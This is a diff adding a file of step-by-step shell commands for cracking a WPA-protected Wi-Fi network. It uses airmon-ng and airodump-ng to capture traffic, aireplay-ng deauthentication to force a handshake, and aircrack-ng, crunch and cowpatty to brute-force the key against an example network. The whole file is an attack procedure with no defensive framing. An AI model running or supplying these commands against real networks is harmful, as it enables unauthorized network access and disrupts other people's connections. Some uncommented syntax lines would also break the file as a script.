@@ -1,0 +1,49 @@
+# Here are listed the steps needed to do the cracking of a wifi network 
+# protected by WPA key using the tools: john the ripper, crunch and aircrack suite.
+
+# become administrator
+sudo su
+
+#disable the network-manager
+/etc/init.d/network-manager stop
+
+# create a virtual network interface (associated with the wireless card) preset
+#in monitor mode. Might need to disable the network card to go in monitor mode
+airmon-ng start wlan0
+
+#to enter monitor mode on any interface, but this will prevent normal operations:
+(ifconfig nomewlan0 down; iwconfig nomewlan0 mode monitor)
+
+#see what are the WPA networks near and the corresponding channel
+airodump-ng mon0
+
+#in our case, we assume the network to be cracked is called DIMAT-WPA,with bssid 00:11:22:33:44:55 and work on channel 2, so we restart focussing on this #channel
+airodump-ng -c 2 --bssid 00:11:22:33:44:55 -w capture_file mon0
+
+#Now we have to deauthenticate one station to capture the handshake. We deauthenticate all station with 2 packet
+aireplay-ng -0 2 -a 00:11:22:33:44:55 mon0
+
+#If we captured the handshake at the top right, in the terminal capture, will appear WPA handshake: 00:11:22:33:44:55
+# Now we cam try to crack the WPA password with aircrack with the common used password list of john the ripper
+aircrack-ng -w /usr/share/john/password.lst capture_file
+
+#In kali linux we can use bigger wordlist called rockyou.txt
+#Unzip the wordlist 
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+#Crack the WPA password with aircrack and rockyou wordlist
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file
+
+#If we want to generate a wordlist we can use crunch. The basic syntax for crunch looks like this:
+    min = The minimum password length.
+    max = The maximum password length.
+    characterset = The character set to be used in generating the passwords.
+    -t <pattern> = The specified pattern of the generated passwords.
+    -o <outputfile> = This is the file you want your wordlist written to.
+#Create a wordlist with with exact length 8 that start with poo and characterset all the lowercase character:
+crunch 8 8 qwertyuiopasdfghjklzxcvbnm -t poo@@@@@ -o newWordlist
+
+#Try to crack the password with the new wordlist
+aircrack-ng -w newWordlist capture_file
+
+#To speedup the cracking time we can use rainbow table with cowpatty.
+cowpatty -d rainbow_table -r capture_file -s DIMAT-WPA
